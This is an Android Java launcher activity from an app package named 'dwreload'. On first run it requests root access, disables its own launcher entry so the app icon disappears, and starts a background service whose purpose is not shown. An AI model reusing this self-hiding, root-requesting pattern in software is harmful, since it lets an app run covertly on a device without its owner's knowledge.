package com.dwreload.activity;

import com.dwreload.DBManager;
import com.dwreload.services.AppService;
import com.stericson.RootTools.RootTools;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.AsyncTask;
import android.os.Bundle;

public class LauncherActivity extends Activity {
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		new FinalPrepareTask().execute();
		startActivity(new Intent(this, MainMenuActivity.class));
        finish();
        
	}
	
	private class FinalPrepareTask extends AsyncTask<Void, Void, Void>{

		@Override
		protected Void doInBackground(Void... params) {
			if (RootTools.isRootAvailable()) {
				RootTools.isAccessGiven();
	        }
			
			PackageManager p = getPackageManager();
	        ComponentName componentName = new ComponentName(LauncherActivity.this, LauncherActivity.class);
	        p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
	        
	        DBManager m = new DBManager(LauncherActivity.this);
	        m.getReadableDatabase().close();
	        m.close();
	        
	        startService(new Intent(LauncherActivity.this, AppService.class));
			return null;
		}
		@Override
		protected void onPostExecute(Void result) {
			super.onPostExecute(result);
		}
		
	}
	
	
}
